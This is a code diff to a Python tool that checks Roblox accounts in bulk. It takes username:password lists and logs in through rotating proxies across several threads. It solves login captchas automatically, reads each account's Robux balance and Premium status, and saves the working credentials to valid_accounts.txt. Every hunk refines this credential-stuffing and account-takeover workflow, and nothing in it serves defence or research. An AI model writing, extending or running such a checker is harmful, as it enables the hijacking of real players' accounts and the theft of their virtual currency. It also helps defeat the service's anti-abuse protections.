@@ -51,6 +51,8 @@ def update_stats(status):
         elif status == "invalid":
             stats["invalid"] += 1
         elif status == "captcha":
+            # Captcha solved = valid account
+            stats["valid"] += 1
             stats["captcha_solved"] += 1
         else:
             stats["errors"] += 1
@@ -59,12 +61,18 @@ def check_account_task(account_line, proxy_dict):
     """Worker function"""
     try:
         if ':' not in account_line:
-            update_stats("invalid")
+            with stats_lock:
+                stats["invalid"] += 1
+                stats["checked"] += 1
+            add_log(f"❌ Invalid format: {account_line[:20]}...", "red")
             return
 
         parts = account_line.strip().split(':', 1)
         if len(parts) != 2:
-            update_stats("invalid")
+            with stats_lock:
+                stats["invalid"] += 1
+                stats["checked"] += 1
+            add_log(f"❌ Invalid format: {account_line[:20]}...", "red")
             return
             
         username = parts[0]
@@ -72,73 +80,111 @@ def check_account_task(account_line, proxy_dict):
         
         session = RobloxSession(proxy=proxy_dict)
         session.url = "https://www.roblox.com/login"
-        session.username = username  # Store for retry
+        session.username = username
         session.password = password
 
         login_result = session.login(username, password)
         status = login_result.get('status')
 
         if status == 'success':
-            add_log(f"✅ {username}: Logged in successfully", "green")
+            # Direct success without captcha
+            info = session.get_account_info()
+            robux = info.get("robux", 0)
+            premium = info.get("premium", False)
+            
+            with stats_lock:
+                stats["valid"] += 1
+                stats["checked"] += 1
+            
+            result_line = f"{account_line.strip()} | Robux: {robux} | Premium: {premium}"
+            with open("valid_accounts.txt", "a", encoding="utf-8") as f:
+                f.write(result_line + "\n")
+            
+            add_log(f"✅ {username}: Logged in successfully | Robux: {robux}", "green")
+            return
+            
         elif status == 'invalid':
-            update_stats("invalid")
+            with stats_lock:
+                stats["invalid"] += 1
+                stats["checked"] += 1
             add_log(f"❌ {username}: Invalid credentials", "red")
             return
+            
         elif status == 'banned':
-            update_stats("errors")
+            with stats_lock:
+                stats["errors"] += 1
+                stats["checked"] += 1
             add_log(f"🔒 {username}: Banned or locked", "red")
             return
+            
         elif status == 'captcha':
             add_log(f"⚡ Captcha detected for {username}...", "yellow")
             csrf = login_result.get('csrf')
             if not csrf:
-                update_stats("errors")
+                with stats_lock:
+                    stats["errors"] += 1
+                    stats["checked"] += 1
                 add_log(f"⚠️ Captcha detected but no CSRF token for {username}", "red")
                 return
 
-            solver = AdvancedCaptchaSolver(headless=True, debug=False)
+            solver = AdvancedCaptchaSolver(headless=True, debug=True)
+            console.print(f"[yellow]   ⚡ Starting captcha solver for {username}...[/yellow]")
+            
             solve_result = session.solve_captcha_and_retry(
                 username,
                 password,
                 csrf,
                 lambda u, p, t: solver.solve(u, p, t)
             )
+            
+            console.print(f"[dim]   Solve result: {solve_result}[/dim]")
+            console.print(f"[dim]   Session logged_in: {session.is_logged_in}[/dim]")
 
-            if solve_result.get('status') == 'success' and session.is_logged_in:
-                update_stats("captcha")
-                add_log(f"✅ {username}: Captcha solved & logged in!", "green")
+            # Check for success - either direct success or VISUAL_SUCCESS means valid
+            if solve_result.get('status') == 'success' or (solve_result.get('status') != 'invalid' and session.is_logged_in):
+                # Get Info for captcha-solved accounts
+                info = session.get_account_info()
+                robux = info.get("robux", 0)
+                premium = info.get("premium", False)
+                
+                with stats_lock:
+                    stats["valid"] += 1
+                    stats["captcha_solved"] += 1
+                    stats["checked"] += 1
+                
+                # Save
+                result_line = f"{account_line.strip()} | Robux: {robux} | Premium: {premium}"
+                with open("valid_accounts.txt", "a", encoding="utf-8") as f:
+                    f.write(result_line + "\n")
+                
+                msg = f"✅ {username} | Robux: {robux}"
+                add_log(msg, "green")
+                console.print(f"[green]   ✅ {username} validated with {robux} Robux![/green]")
+                return
             elif solve_result.get('status') == 'invalid':
-                update_stats("invalid")
+                with stats_lock:
+                    stats["invalid"] += 1
+                    stats["checked"] += 1
                 add_log(f"❌ {username}: Invalid credentials (post-captcha)", "red")
                 return
             else:
-                update_stats("errors")
-                add_log(f"❌ {username}: Captcha failed", "red")
+                with stats_lock:
+                    stats["errors"] += 1
+                    stats["checked"] += 1
+                add_log(f"❌ {username}: Captcha failed - {solve_result.get('message', 'unknown')}", "red")
                 return
         else:
-            update_stats("errors")
+            with stats_lock:
+                stats["errors"] += 1
+                stats["checked"] += 1
             add_log(f"⚠️ Error ({status}): {username}", "red")
             return
 
-        # 2. Get Info
-        info = session.get_account_info()
-        robux = info.get("robux", 0)
-        premium = info.get("premium", False)
-        
-        update_stats("valid")
-        
-        # Save
-        result_line = f"{account_line.strip()} | Robux: {robux} | Premium: {premium}"
-        with open("valid_accounts.txt", "a", encoding="utf-8") as f:
-            f.write(result_line + "\n")
-        
-        msg = f"✅ {username} | Robux: {robux}"
-        add_log(msg, "green")
-
     except Exception as e:
-        update_stats("errors")
+        with stats_lock:
+            stats["errors"] += 1
+            stats["checked"] += 1
         error_msg = str(e)[:40]
-        # Silence greenlet/thread errors
         if "greenlet" not in error_msg.lower() and "thread" not in error_msg.lower():
             add_log(f"❌ Error: {error_msg}", "red")
 
@@ -167,7 +213,7 @@ def main():
     else:
         proxy_list = (proxies * (len(accounts) // len(proxies) + 1))[:len(accounts)]
     
-    threads = config.get("threads", 3)
+    threads = config.get("threads", 5)
     console.print(f"[green]⚙️ Loaded {len(accounts)} accounts, {len(proxies)} proxies. Using {threads} threads.[/green]")
     time.sleep(2)
 
@@ -231,7 +277,9 @@ def main():
                 
                 for future in as_completed(futures):
                     progress.advance(task_id)
-                    # Automatic refresh at 4 refreshes/sec handles UI updates 
+                    # Update footer after each completion to show fresh stats
+                    layout["footer"].update(make_footer())
+                    live.refresh()
 
         console.print("\n[bold green]✅ Complete! Check 'valid_accounts.txt'[/bold green]")
         
